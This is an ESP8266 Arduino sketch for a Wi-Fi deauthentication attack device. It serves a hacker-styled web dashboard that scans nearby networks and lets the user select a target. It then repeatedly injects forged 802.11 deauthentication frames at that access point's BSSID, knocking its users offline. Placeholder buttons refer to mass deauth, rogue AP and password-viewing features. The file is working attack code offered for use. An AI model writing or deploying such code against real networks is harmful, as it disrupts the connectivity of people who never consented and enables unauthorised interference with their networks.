/*
 * OMNI DEAUTH V8.2 - SDK 2.0.0 MURNI
 * DASHBOARD M1Z23R X GMPRO2 v5.6
 * FIX BSSID ERROR FOR CORE 2.4.2
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

ESP8266WebServer server(80);
DNSServer dnsServer;

const char* ap_ssid = "GMpro2";
const char* ap_pass = "sangkur87";

bool attacking = false;
String target_name = "NONE";
uint8_t target_mac[6];
uint8_t target_ch = 1;

String getHTML() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:10px;margin:0;}";
  html += "h2{text-align:center;color:#ff4500;text-shadow:0 0 5px #ff4500;font-size:16px;margin:10px 0;}";
  html += ".status-box{border:1px solid #444;padding:10px;background:#111;font-size:11px;margin-bottom:10px;border-left:4px solid #ff4500;}";
  html += ".grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:15px;}";
  html += ".btn{padding:12px;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:10px;font-weight:bold;border-bottom:3px solid rgba(0,0,0,0.5);transition:0.2s;cursor:pointer;}";
  html += ".btn-deauth{background:#c0392b;} .btn-rogue{background:#d35400;} .btn-mass{background:#111;border:1px solid #ff4500;color:#ff4500;grid-column:span 2;}";
  html += ".btn-hybrid{background:#8e44ad;grid-column:span 2;} .btn-scan{background:#2980b9;} .btn-upload{background:#607d8b;} .btn-log{background:#27ae60;} .btn-clear{background:#b33939;} .btn-stop{background:#444;grid-column:span 2;}";
  html += "#log-area{background:#050505;color:#0f0;border:1px solid #333;height:100px;overflow-y:scroll;padding:8px;font-size:10px;margin-bottom:15px;}";
  html += ".table-container{width:100%;overflow-x:auto;margin-top:5px;border:1px solid #333;}";
  html += "table{width:100%;border-collapse:collapse;font-size:11px;background:#0a0a0a;} th{background:#222;color:#ff4500;padding:10px;text-align:left;} td{padding:10px;border-bottom:1px solid #222;}";
  html += ".sig-high{color:#0f0;font-weight:bold;} .sel-link{color:#0af;text-decoration:none;font-weight:bold;border:1px solid #0af;padding:3px 6px;border-radius:3px;}</style></head><body>";
  
  html += "<h2>M1Z23R X GMPRO2 v5.6</h2>";
  html += "<div class='status-box'>TARGET : <span style='color:#fff'>" + target_name + "</span><br>STATUS : <span style='color:#0f0'>" + (attacking ? "ATTACKING" : "READY") + "</span></div>";
  html += "<div class='grid'><a href='/attack' class='btn btn-deauth'>DEAUTH TARGET</a><a href='#' class='btn btn-rogue'>ROGUE AP PRANK</a><a href='#' class='btn btn-mass'>MASS DEAUTH</a><a href='#' class='btn btn-hybrid'>HYBRID ATTACK</a><a href='/scan' class='btn btn-scan'>RE-SCAN</a><a href='#' class='btn btn-upload'>UPLOAD UI</a><a href='#' class='btn btn-log'>VIEW PASS</a><a href='#' class='btn btn-clear'>CLEAR LOG</a><a href='/stop' class='btn btn-stop'>STOP / RESET NODE</a></div>";
  html += "<div id='log-area'>[SYSTEM] Dashboard v5.6 Active.<br>[LOG] " + (attacking ? "Sending Packets..." : "Ready.") + "</div>";
  html += "<div class='table-container'><table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody>";
  
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + String(WiFi.channel(i)) + "</td><td class='sig-high'>" + String(WiFi.RSSI(i)) + "</td><td><a href='/select?id=" + String(i) + "' class='sel-link'>SELECT</a></td></tr>";
  }
  
  html += "</tbody></table></div></body></html>";
  return html;
}

void sendDeauth(uint8_t* mac, uint8_t ch) {
  uint8_t packet[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],0x00,0x00,0x01,0x00};
  wifi_set_channel(ch);
  wifi_send_pkt_freedom(packet, 26, 0);
}

void setup() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.on("/", [](){ server.send(200, "text/html", getHTML()); });
  server.on("/scan", [](){ WiFi.scanNetworks(true); server.send(200, "text/html", "<script>location.href='/';</script>"); });
  server.on("/select", [](){
    int id = server.arg("id").toInt();
    target_name = WiFi.SSID(id);
    // FIX: Cara ambil BSSID di Core 2.4.2
    uint8_t* bssid = WiFi.BSSID(id);
    for(int i=0; i<6; i++) target_mac[i] = bssid[i];
    target_ch = WiFi.channel(id);
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });
  server.on("/attack", [](){ attacking = true; server.send(200, "text/html", "<script>location.href='/';</script>"); });
  server.on("/stop", [](){ attacking = false; server.send(200, "text/html", "<script>location.href='/';</script>"); });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (attacking) { for(int i=0; i<5; i++){ sendDeauth(target_mac, target_ch); } yield(); }
}
